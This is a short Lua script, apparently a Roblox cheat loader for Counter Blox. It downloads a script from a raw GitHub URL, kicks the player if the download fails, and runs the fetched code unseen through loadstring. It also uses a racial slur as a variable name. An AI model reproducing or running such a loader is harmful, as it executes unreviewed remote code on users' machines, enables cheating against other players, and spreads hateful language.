
local nigger, returned = pcall(function() 
    return game:HttpGet("https://raw.githubusercontent.com/Iocqs/salad.tk/main/cb.lua")
end)
if not (nigger and returned and #returned ~= 0) then 
    return plr:Kick("Please open Counter Blox and Re-execute")
end


loadstring(tostring(returned))()
